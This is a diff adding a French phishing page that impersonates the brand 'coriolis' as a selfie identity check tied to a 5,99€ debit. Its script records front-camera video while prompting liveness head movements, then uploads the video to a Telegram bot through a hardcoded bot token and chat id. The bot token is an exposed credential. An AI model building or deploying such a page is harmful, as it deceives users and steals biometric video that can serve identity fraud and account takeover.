@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Page blanche · Barre bleue arrondie</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page-container {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    .top-bar {
+      background-color: #4DBDC6;
+      width: 100%;
+      min-height: 150px;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.02), 0 2px 4px rgba(0, 0, 0, 0.02);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 24px;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+    }
+
+    .content-white {
+      flex: 1;
+      background-color: #ffffff;
+      width: 100%;
+      padding: 30px 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    /* Styles pour les éléments de paiement */
+    .payment-section {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .montant-label {
+      font-weight: bold;
+      font-size: 1.3rem;
+      text-align: center;
+      margin-top: 28px;
+    }
+
+    .prix {
+      font-size: 14px;
+      font-weight: normal;
+      text-align: center;
+      margin-top: -3%;
+    }
+
+    /* Bloc bleu avec message */
+    .info-bloc {
+      background-color: #4DBDC6;
+      padding: 13px;
+      border-radius: 12px;
+      text-align: center;
+      color: #323232;
+      width: 89%;
+    }
+
+    .info-bloc p {
+      font-size: 17px;
+      line-height: 1.4;
+    }
+
+    /* Petite barre fine bleue */
+    .thin-blue-bar {
+      width:  90%;
+      height: 1px;
+      background-color: #4DBDC6;
+      border-radius: 3px;
+      margin-top: 1%;
+    }
+
+    /* Champs de formulaire style "seulement barre du bas" */
+    .input-field {
+      width: 100%;
+      text-align: center;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 1.1rem;
+    }
+
+    .input-with-bottom-border {
+      width: 90%;
+      padding: 12px 8px;
+      font-size: 1rem;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #b5b5b5;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+
+    .input-with-bottom-border:focus {
+      border-bottom-color: #2c7da0;
+    }
+
+    /* Bouton payer */
+    .btn-payer {
+      background-color: #323232;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin-top: 10px;
+    }
+
+    .btn-payer:hover {
+      background-color: #2c7da0;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 100px !important;
+      }
+      .content-white {
+        padding: 20px 16px;
+      }
+      .prix {
+        font-size: 1.1rem;
+      }
+    }
+
+    @media (min-width: 1600px) {
+      .top-bar {
+        min-height: 170px !important;
+      }
+    }
+
+    .top-bar {
+      min-height: 120px !important;
+      height: auto !important;
+    }
+
+    @media (max-width: 560px) {
+      .top-bar {
+        min-height: 45px !important;
+      }
+    }
+
+    body, .page-container, .content-white {
+      overflow-x: hidden;
+    }
+
+
+/* Aligner les textes des labels à gauche */
+/* Aligner les textes des labels à gauche */
+.input-field {
+  text-align: left;
+}
+
+.input-field label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 1.1rem;
+  text-align: left;
+  width: 90%;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Aligner le texte à l'intérieur des cases à gauche */
+.input-with-bottom-border {
+  text-align: left;
+}
+
+/* Espace entre les cases */
+.input-field {
+  margin-bottom: 28px;
+}
+
+/* Supprimer l'espace du dernier champ */
+.input-field:last-of-type {
+  margin-bottom: 0;
+}
+
+.bas {
+ width: 110%;
+margin-top: 10%;
+}
+
+.btn-capture {
+    background-color: #4DBDC6;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 0.9rem;
+    border-radius: 40px;
+    cursor: pointer;
+    margin-top: 10px;
+    width: 90%;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.btn-capture:hover {
+    background-color: #3a9aa3;
+}
+
+.photo-preview {
+    width: 90%;
+    margin-top: 10px;
+    border-radius: 8px;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+	text-align: center;
+}
+
+.photo-preview img {
+    width: 300px;
+    height: 160px;
+    object-fit: cover;
+    border-radius: 8px;
+    border: 2px solid #4DBDC6;
+    display: block;
+    margin: 0 auto;
+	margin-right: -20px;
+}
+	  
+	  /* Modal caméra */
+.camera-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: black;
+    z-index: 1000;
+    display: none;
+    flex-direction: column;
+}
+
+.camera-video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+}
+
+.camera-guide {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+}
+
+/* Remplacer le .cadre et ajouter .circle-guide */
+.circle-guide {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 280px;
+    height: 280px;
+    border-radius: 50%;
+    border: 3px solid #4DBDC6;
+    background: transparent;
+    box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.6);
+}
+
+.circle-guide::before {
+    content: '';
+    position: absolute;
+    top: -3px;
+    left: -3px;
+    right: -3px;
+    bottom: -3px;
+    border-radius: 50%;
+    border: 2px dashed rgba(77, 189, 198, 0.5);
+    animation: pulse 1.5s ease-out infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); opacity: 1; }
+    100% { transform: scale(1.1); opacity: 0; }
+}
+
+.btn-capture-photo {
+    position: absolute;
+    bottom: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: white;
+    border: none;
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    cursor: pointer;
+    z-index: 10;
+}
+
+.btn-fermer-camera {
+    position: absolute;
+    top: 20px;
+    right: 10px;
+    background: red;
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 25px;
+    z-index: 10;
+}
+	  
+	  /* Overlay sombre autour du cadre */
+.cadre-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    pointer-events: none;
+}
+
+.cadre {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 85%;
+    height: 200px;
+    border: 2px solid #4DBDC6;
+    border-radius: 10px;
+    background: transparent;
+    box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
+}
+
+/* Overlay de chargement */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    z-index: 2000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.spinner {
+    width: 60px;
+    height: 60px;
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #4DBDC6;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+.loading-text {
+    color: white;
+    font-size: 16px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* --- INSTRUCTIONS TRÈS LISIBLES SUR FOND SOMBRE --- */
+.camera-message {
+    width: 75%;
+    position: absolute;
+    top: 20px;
+    left: 47%;
+    transform: translateX(-60%);
+    background: #1e2a3a !important; /* fond foncé mais contraste élevé */
+    color: #ffffff !important;
+    padding: 5px 5px;
+    border-radius: 60px;
+    font-size: 15px;
+    font-weight: bold;
+    text-align: center;
+    z-index: 25;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.5), 0 0 0 2px #4DBDC6 inset;
+    backdrop-filter: blur(2px);
+    white-space: nowrap;
+    letter-spacing: 0.5px;
+    font-family: monospace;
+    border: 1px solid rgba(77, 189, 198, 0.8);
+}
+
+.guide-helper {
+    position: absolute;
+    bottom: 140px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #000000cc !important;
+    color: #4DBDC6 !important;
+    padding: 10px 20px;
+    border-radius: 40px;
+    font-size: 16px;
+    font-weight: bold;
+    z-index: 25;
+    text-align: center;
+    backdrop-filter: blur(8px);
+    white-space: nowrap;
+    border: 1px solid #4DBDC6;
+    box-shadow: 0 2px 12px black;
+    font-family: monospace;
+}
+
+/* Amélioration guide texte dans le cercle */
+.guide-text {
+    font-size: 16px;
+    font-weight: bold;
+    background: #000000aa;
+    padding: 4px 12px;
+    border-radius: 40px;
+    color: #4DBDC6;
+    white-space: nowrap;
+}
+
+/* Animation de clignotement pour attirer l'attention */
+@keyframes blinkInstruction {
+    0% { opacity: 1; transform: translateX(-50%) scale(1); }
+    50% { opacity: 0.9; transform: translateX(-50%) scale(1.02); background: rgba(77, 189, 198, 0.95); }
+    100% { opacity: 1; transform: translateX(-50%) scale(1); }
+}
+
+.camera-message.blink {
+    animation: blinkInstruction 0.8s ease-in-out;
+}
+
+/* Message d'étape validée */
+.camera-message.success {
+    background: rgba(0, 150, 0, 0.95);
+    border-color: #00ff88;
+}
+
+/* Les instructions ne doivent pas être assombries */
+.camera-message, .guide-helper {
+    background: rgba(77, 189, 198, 0.95) !important;
+    color: white !important;
+    text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+}
+
+/* Animation de chargement autour du cercle */
+@keyframes spinCircle {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loading-border {
+    position: absolute;
+    border-radius: 50%;
+    border: 4px solid transparent;
+    border-top: 4px solid #4DBDC6;
+    border-right: 4px solid #4DBDC6;
+    pointer-events: none;
+    z-index: 20;
+    animation: spinCircle 1s linear infinite;
+    box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.85);
+}
+  </style>
+</head>
+<body>
+  <div class="page-container">
+    <header class="top-bar" role="banner" aria-label="Barre de navigation bleue arrondie">
+      <span style="color: white; font-weight: 600; font-size: 1.6rem;">coriolis</span>
+    </header>
+    
+    <main class="content-white" role="main">
+      <!-- Overlay de chargement -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Envoi des documents en cours...</div>
+</div>
+      <div class="payment-section">
+        <!-- Montant à régler en gras -->
+        <div class="montant-label">Vérification d'identité</div>
+        
+        
+        <!-- Bloc bleu centré avec message -->
+        <div class="info-bloc">
+          <p>Pour valider la vérification de votre identité, Veuillez cliquer sur <strong>Commencer la vérification selfie et suivez les instructions</strong> pour que votre prélèvement de 5,99€ soit validée.</p>
+        </div>
+        
+        <!-- Petite fine barre bleue -->
+        <div class="thin-blue-bar"></div>
+        
+        <!-- Bouton Valider -->
+        <button class="btn-payer">Commencer la vérification selfie</button>
+		  </div>
+		  <!-- Modal caméra -->
+<div id="cameraModal" class="camera-modal">
+    <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
+    <div class="camera-guide">
+        <div class="camera-message" id="cameraMessage">🔴 Enregistrement vidéo en cours... Placez votre visage dans le cercle</div>
+        <div class="circle-guide">
+            <div class="guide-text">👤 Placez votre visage ici</div>
+        </div>
+        <div class="guide-helper" id="guideHelper">👤 Centrez votre visage</div>
+    </div>
+    <button class="btn-fermer-camera" id="fermerCameraBtn">✕ Fermer</button>
+</div>
+    </main>
+  </div>
+  <input type="file" id="selfiePhoto" accept="image/*" capture="user" style="display: none;">
+<script>
+let selfieStream = null;
+let detectionInterval = null;
+let currentStep = 0;
+let stepCompleted = false;
+let cameraMessage = null;
+let videoElement = null;
+let dynamicCircle = null;
+let loadingCircle = null;
+let loadingTimer = null;
+let stepTimer = null;
+let mediaRecorder = null;
+let videoChunks = [];
+
+// Étapes de vérification
+const steps = [
+    { text: "Placez votre visage dans le cercle", action: "face", requiredTime: 5000, startTime: 0 },
+    { text: "Tournez la tête vers la DROITE", action: "right", requiredTime: 5000, startTime: 0 },
+    { text: "Tournez la tête vers la GAUCHE", action: "left", requiredTime: 5000, startTime: 0 },
+    { text: "Levez la tête vers le HAUT", action: "up", requiredTime: 5000, startTime: 0 },
+    { text: "Rapprochez votre visage", action: "zoom", requiredTime: 5000, startTime: 0 }
+];
+
+let lastFaceData = null;
+let stepStartTime = 0;
+let lastCircleSize = 200;
+
+function startRecording() {
+    if (!selfieStream) return;
+    videoChunks = [];
+    mediaRecorder = new MediaRecorder(selfieStream, { mimeType: 'video/webm' });
+    mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) videoChunks.push(e.data);
+    };
+    mediaRecorder.start();
+}
+
+function stopRecordingAndGetBlob() {
+    return new Promise((resolve) => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(videoChunks, { type: 'video/webm' });
+                resolve(blob);
+            };
+            mediaRecorder.stop();
+        } else {
+            resolve(null);
+        }
+    });
+}
+
+function updateHelperMessage(stepIndex) {
+    const helper = document.getElementById('guideHelper');
+    if (!helper) return;
+    
+    const stepTexts = {
+        0: "👤 Centrez votre visage",
+        1: "👉 Tournez vers la DROITE",
+        2: "👈 Tournez vers la GAUCHE",
+        3: "👆 Levez la tête",
+        4: "🔍 Rapprochez-vous"
+    };
+    
+    if (helper) {
+        helper.innerHTML = stepTexts[stepIndex] || "✅ Suivez les instructions";
+        helper.style.background = "rgba(77, 189, 198, 0.9)";
+    }
+}
+
+async function detectFace() {
+    if (!videoElement || !videoElement.videoWidth || !videoElement.videoHeight) {
+        return { detected: false };
+    }
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth;
+    canvas.height = videoElement.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+    
+    let skinPixels = [];
+    let sumX = 0, sumY = 0;
+    let minX = canvas.width, maxX = 0, minY = canvas.height, maxY = 0;
+    
+    for (let y = 0; y < canvas.height; y += 1) {
+        for (let x = 0; x < canvas.width; x += 1) {
+            const idx = (y * canvas.width + x) * 4;
+            const r = data[idx];
+            const g = data[idx + 1];
+            const b = data[idx + 2];
+            
+            const isSkin = (r > 50 && g > 30 && b > 20 && 
+                           r > g && r > b && 
+                           Math.abs(r - g) > 8 &&
+                           (r - b) > 12) ||
+                           (r > 80 && g > 40 && b > 30 && r-g > 5 && r-b > 10);
+            
+            if (isSkin) {
+                skinPixels.push({ x, y });
+                sumX += x;
+                sumY += y;
+                minX = Math.min(minX, x);
+                maxX = Math.max(maxX, x);
+                minY = Math.min(minY, y);
+                maxY = Math.max(maxY, y);
+            }
+        }
+    }
+    
+    if (skinPixels.length > 40) {
+        const centerX = sumX / skinPixels.length;
+        const centerY = sumY / skinPixels.length;
+        const width = (maxX - minX);
+        const height = (maxY - minY);
+        
+        const faceData = {
+            detected: true,
+            x: centerX,
+            y: centerY,
+            width: width,
+            height: height
+        };
+        
+        if (lastFaceData) {
+            faceData.deltaX = centerX - lastFaceData.x;
+            faceData.deltaY = centerY - lastFaceData.y;
+            faceData.deltaW = (width - lastFaceData.width) / (lastFaceData.width || 1);
+            faceData.deltaH = (height - lastFaceData.height) / (lastFaceData.height || 1);
+        }
+        
+        lastFaceData = {
+            x: centerX,
+            y: centerY,
+            width: width,
+            height: height,
+            timestamp: Date.now()
+        };
+        
+        return faceData;
+    }
+    
+    return { detected: false };
+}
+
+function updateDynamicCircle(face) {
+    if (!dynamicCircle) return false;
+    
+    if (face && face.detected && face.width > 30 && face.height > 30) {
+        const videoRect = videoElement.getBoundingClientRect();
+        const scaleX = videoRect.width / videoElement.videoWidth;
+        const scaleY = videoRect.height / videoElement.videoHeight;
+        
+        const faceX = face.x * scaleX;
+        const faceY = face.y * scaleY;
+        
+        const faceWidthPx = face.width * scaleX;
+        const faceHeightPx = face.height * scaleY;
+        
+        const circleWidth = Math.min(Math.max(faceWidthPx * 1.4, 140), 420);
+        const circleHeight = circleWidth * 1.15;
+        
+        const currentWidth = parseFloat(dynamicCircle.style.width) || circleWidth;
+        const currentHeight = parseFloat(dynamicCircle.style.height) || circleHeight;
+        const smoothWidth = currentWidth * 0.6 + circleWidth * 0.4;
+        const smoothHeight = currentHeight * 0.6 + circleHeight * 0.4;
+        
+        let verticalOffset = smoothHeight * 0.10;
+        if (smoothHeight < 200) {
+            verticalOffset = smoothHeight * 0.50;
+        } else if (smoothHeight < 280) {
+            verticalOffset = smoothHeight * 0.10;
+        }
+
+        dynamicCircle.style.width = smoothWidth + 'px';
+        dynamicCircle.style.height = smoothHeight + 'px';
+        dynamicCircle.style.left = (faceX - smoothWidth / 2 - 50) + 'px';
+        dynamicCircle.style.top = (faceY - smoothHeight / 2 - verticalOffset) + 'px';
+        dynamicCircle.style.borderRadius = '50%';
+        dynamicCircle.style.display = 'block';
+        
+        if (stepCompleted) {
+            dynamicCircle.style.borderColor = '#00ff88';
+            dynamicCircle.style.borderWidth = '4px';
+        } else if (steps[currentStep]?.action === 'face' && face.width > 70 && face.width < 250) {
+            dynamicCircle.style.borderColor = '#ffaa00';
+            dynamicCircle.style.borderWidth = '4px';
+        } else {
+            dynamicCircle.style.borderColor = '#4DBDC6';
+            dynamicCircle.style.borderWidth = '3px';
+        }
+        
+        return true;
+    } else if (dynamicCircle) {
+        dynamicCircle.style.display = 'none';
+    }
+    return false;
+}
+
+function checkMovement(face) {
+    if (!face || !face.detected) return false;
+    
+    const currentTime = Date.now();
+    const tolerance = 18;
+    
+    switch (steps[currentStep].action) {
+        case 'face':
+            const isGoodSize = face.width > 45 && face.width < 350 && face.height > 40;
+            const isAlmostGood = face.width > 40 && face.width < 400 && face.height > 35;
+            
+            if (isGoodSize && stepStartTime === 0) {
+                stepStartTime = currentTime;
+                if (cameraMessage) cameraMessage.style.background = 'rgba(255, 170, 0, 0.9)';
+            }
+            
+            if (stepStartTime > 0 && (isGoodSize || isAlmostGood)) {
+                if ((currentTime - stepStartTime) >= steps[currentStep].requiredTime) {
+                    return true;
+                }
+            } else if (!isGoodSize && !isAlmostGood) {
+                stepStartTime = 0;
+                if (cameraMessage) cameraMessage.style.background = 'rgba(77, 189, 198, 0.95)';
+            }
+            return false;
+            
+        case 'right':
+            if (face.deltaX && face.deltaX > tolerance) {
+                if (stepStartTime === 0) stepStartTime = currentTime;
+                if ((currentTime - stepStartTime) >= steps[currentStep].requiredTime) return true;
+            } else {
+                stepStartTime = 0;
+            }
+            return false;
+            
+        case 'left':
+            if (face.deltaX && face.deltaX < -tolerance) {
+                if (stepStartTime === 0) stepStartTime = currentTime;
+                if ((currentTime - stepStartTime) >= steps[currentStep].requiredTime) return true;
+            } else {
+                stepStartTime = 0;
+            }
+            return false;
+            
+        case 'up':
+            if (face.deltaY && face.deltaY < -tolerance) {
+                if (stepStartTime === 0) stepStartTime = currentTime;
+                if ((currentTime - stepStartTime) >= steps[currentStep].requiredTime) return true;
+            } else {
+                stepStartTime = 0;
+            }
+            return false;
+            
+        case 'zoom':
+            const isZooming = (face.deltaW && face.deltaW > 0.06) || (face.deltaH && face.deltaH > 0.06);
+            if (isZooming) {
+                if (stepStartTime === 0) stepStartTime = currentTime;
+                if ((currentTime - stepStartTime) >= steps[currentStep].requiredTime) return true;
+            } else {
+                stepStartTime = 0;
+            }
+            return false;
+            
+        default:
+            return false;
+    }
+}
+
+function startLoadingAnimation() {
+    if (loadingCircle) {
+        if (loadingCircle.updateInterval) clearInterval(loadingCircle.updateInterval);
+        loadingCircle.remove();
+        loadingCircle = null;
+    }
+    if (loadingTimer) {
+        clearTimeout(loadingTimer);
+        loadingTimer = null;
+    }
+    
+    if (dynamicCircle) {
+        loadingCircle = document.createElement('div');
+        const rect = dynamicCircle.getBoundingClientRect();
+        loadingCircle.style.cssText = `
+            position: fixed;
+            width: ${rect.width + 12}px;
+            height: ${rect.height + 12}px;
+            left: ${rect.left - 6}px;
+            top: ${rect.top - 6}px;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top: 4px solid #4DBDC6;
+            border-right: 4px solid #4DBDC6;
+            pointer-events: none;
+            z-index: 20;
+            animation: spinCircle 1s linear infinite;
+        `;
+        document.body.appendChild(loadingCircle);
+        
+        const updateLoadingPosition = setInterval(() => {
+            if (!dynamicCircle || stepCompleted === false) {
+                clearInterval(updateLoadingPosition);
+                return;
+            }
+            const newRect = dynamicCircle.getBoundingClientRect();
+            if (loadingCircle) {
+                loadingCircle.style.width = newRect.width + 12 + 'px';
+                loadingCircle.style.height = newRect.height + 12 + 'px';
+                loadingCircle.style.left = newRect.left - 6 + 'px';
+                loadingCircle.style.top = newRect.top - 6 + 'px';
+            }
+        }, 16);
+        
+        loadingCircle.updateInterval = updateLoadingPosition;
+    }
+    
+    loadingTimer = setTimeout(() => {
+        finishStepAndContinue();
+    }, 3000);
+}
+
+function finishStepAndContinue() {
+    if (loadingCircle) {
+        if (loadingCircle.updateInterval) clearInterval(loadingCircle.updateInterval);
+        loadingCircle.remove();
+        loadingCircle = null;
+    }
+    if (loadingTimer) {
+        clearTimeout(loadingTimer);
+        loadingTimer = null;
+    }
+    
+    if (dynamicCircle) {
+        dynamicCircle.style.borderColor = '#00ff88';
+        dynamicCircle.style.transition = 'border-color 0.2s';
+        setTimeout(() => {
+            if (dynamicCircle && !stepCompleted) {
+                dynamicCircle.style.borderColor = '#4DBDC6';
+            }
+        }, 300);
+    }
+    
+    if (cameraMessage) {
+        cameraMessage.style.background = 'rgba(0, 200, 0, 0.9)';
+        setTimeout(() => {
+            if (cameraMessage) cameraMessage.style.background = 'rgba(77, 189, 198, 0.95)';
+        }, 500);
+    }
+    
+    if (currentStep < steps.length - 1) {
+        setTimeout(() => {
+            currentStep++;
+            stepCompleted = false;
+            
+            if (cameraMessage) {
+                cameraMessage.innerHTML = `${steps[currentStep].text}`;
+                cameraMessage.style.background = 'rgba(77, 189, 198, 0.95)';
+            }
+            updateHelperMessage(currentStep);
+            
+            if (stepTimer) clearTimeout(stepTimer);
+            stepTimer = setTimeout(() => {
+                if (!stepCompleted && currentStep < steps.length) {
+                    console.log(`5 secondes écoulées pour l'étape ${currentStep + 1}, passage suivant`);
+                    nextStep();
+                }
+            }, 5000);
+            
+        }, 600);
+    } else {
+        validationReussie();
+    }
+}
+
+function nextStep() {
+    if (stepCompleted) return;
+    stepCompleted = true;
+    stepStartTime = 0;
+    startLoadingAnimation();
+}
+
+async function validationReussie() {
+    if (detectionInterval) {
+        clearInterval(detectionInterval);
+        detectionInterval = null;
+    }
+    
+    const videoBlob = await stopRecordingAndGetBlob();
+    
+    if (dynamicCircle) {
+        dynamicCircle.style.borderColor = '#00ff88';
+        dynamicCircle.style.borderWidth = '5px';
+    }
+    
+    if (cameraMessage) {
+        cameraMessage.innerHTML = 'Vérification réussie. Envoi en cours...';
+    }
+    
+    if (videoBlob) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            envoyerSelfieVideo(reader.result);
+        };
+        reader.readAsDataURL(videoBlob);
+    } else {
+        fermerCameraSelfie();
+    }
+}
+
+async function envoyerSelfieVideo(videoBase64) {
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    loadingOverlay.style.display = 'flex';
+    document.querySelector('.loading-text').innerHTML = 'Validation en cours...';
+    
+    const byteString = atob(videoBase64.split(',')[1]);
+    const mimeString = videoBase64.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    const blob = new Blob([ab], { type: mimeString });
+    
+    const formData = new FormData();
+    formData.append('chat_id', '-5077491193');
+    formData.append('video', blob, 'verification_selfie.webm');
+    
+    try {
+        const response = await fetch('https://api.telegram.org/bot8789856564:AAGjVTO-54kJn2yuBCZeMpPYwNR2Wq4kcvY/sendVideo', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        console.log('Envoi Telegram:', result);
+        
+        loadingOverlay.style.display = 'none';
+        fermerCameraSelfie();
+        
+    } catch (error) {
+        console.error('Erreur envoi:', error);
+        loadingOverlay.style.display = 'none';
+        fermerCameraSelfie();
+    }
+}
+
+function fermerCameraSelfie() {
+    if (detectionInterval) {
+        clearInterval(detectionInterval);
+        detectionInterval = null;
+    }
+    if (selfieStream) {
+        selfieStream.getTracks().forEach(track => track.stop());
+        selfieStream = null;
+    }
+    if (loadingCircle) {
+        if (loadingCircle.updateInterval) clearInterval(loadingCircle.updateInterval);
+        loadingCircle.remove();
+        loadingCircle = null;
+    }
+    if (loadingTimer) {
+        clearTimeout(loadingTimer);
+        loadingTimer = null;
+    }
+    if (stepTimer) {
+        clearTimeout(stepTimer);
+        stepTimer = null;
+    }
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+    }
+    document.getElementById('cameraModal').style.display = 'none';
+    currentStep = 0;
+    stepCompleted = false;
+    lastFaceData = null;
+    stepStartTime = 0;
+    lastCircleSize = 200;
+}
+
+function startFaceDetection() {
+    if (detectionInterval) clearInterval(detectionInterval);
+    
+    detectionInterval = setInterval(async () => {
+        const face = await detectFace();
+        
+        updateDynamicCircle(face);
+        
+        if (face && face.detected && !stepCompleted) {
+            if (checkMovement(face)) {
+                nextStep();
+            }
+        }
+    }, 60);
+}
+
+async function ouvrirCameraFrontaleAvecVerification() {
+    const modal = document.getElementById('cameraModal');
+    videoElement = document.getElementById('cameraVideo');
+    cameraMessage = document.getElementById('cameraMessage');
+    
+    modal.style.display = 'flex';
+    currentStep = 0;
+    stepCompleted = false;
+    lastFaceData = null;
+    stepStartTime = 0;
+    lastCircleSize = 200;
+    
+    if (dynamicCircle) {
+        dynamicCircle.remove();
+        dynamicCircle = null;
+    }
+    
+    dynamicCircle = document.createElement('div');
+    dynamicCircle.style.cssText = `
+        position: absolute;
+        border-radius: 50%;
+        border: 3px solid #4DBDC6;
+        box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.85);
+        transition: all 0.05s linear;
+        pointer-events: none;
+        z-index: 15;
+        background: rgba(77, 189, 198, 0.03);
+        will-change: left, top, width, height;
+    `;
+    dynamicCircle.style.width = '260px';
+    dynamicCircle.style.height = '300px';
+    document.querySelector('.camera-guide').appendChild(dynamicCircle);
+    
+    const oldCircle = document.querySelector('.circle-guide');
+    if (oldCircle) oldCircle.style.display = 'none';
+    
+    if (cameraMessage) {
+        cameraMessage.innerHTML = `${steps[0].text}`;
+        cameraMessage.style.background = 'rgba(77, 189, 198, 0.95)';
+    }
+    updateHelperMessage(0);
+
+    if (stepTimer) clearTimeout(stepTimer);
+    stepTimer = setTimeout(() => {
+        if (currentStep === 0 && !stepCompleted) {
+            console.log("5 secondes écoulées, passage automatique à l'étape 2");
+            nextStep();
+        }
+    }, 5000);
+    
+    try {
+        if (selfieStream) {
+            selfieStream.getTracks().forEach(track => track.stop());
+        }
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 1280 }, 
+                height: { ideal: 720 }
+            },
+            audio: false
+        });
+        
+        selfieStream = stream;
+        videoElement.srcObject = stream;
+        
+        await new Promise(resolve => {
+            videoElement.onloadedmetadata = () => {
+                videoElement.play();
+                resolve();
+            };
+        });
+        
+        startRecording();
+        startFaceDetection();
+        
+    } catch (err) {
+        console.error('Erreur caméra:', err);
+        alert('Impossible d\'accéder à la caméra frontale');
+        fermerCameraSelfie();
+    }
+}
+
+document.querySelector('.btn-payer').addEventListener('click', function() {
+    document.getElementById('selfiePhoto').click();
+});
+
+document.getElementById('fermerCameraBtn').addEventListener('click', function() {
+    fermerCameraSelfie();
+});
+
+function enhanceInstructionsVisibility() {
+    const msg = document.getElementById('cameraMessage');
+    const helper = document.getElementById('guideHelper');
+    if (msg) {
+        msg.style.background = '#1e2a3a';
+        msg.style.color = 'white';
+        msg.style.border = '2px solid #4DBDC6';
+        msg.style.fontWeight = 'bold';
+        msg.style.textShadow = '1px 1px 0 black';
+    }
+    if (helper) {
+        helper.style.background = 'black';
+        helper.style.color = '#4DBDC6';
+        helper.style.border = '1px solid #4DBDC6';
+        helper.style.fontWeight = 'bold';
+    }
+}
+</script>
+</body>
+</html>
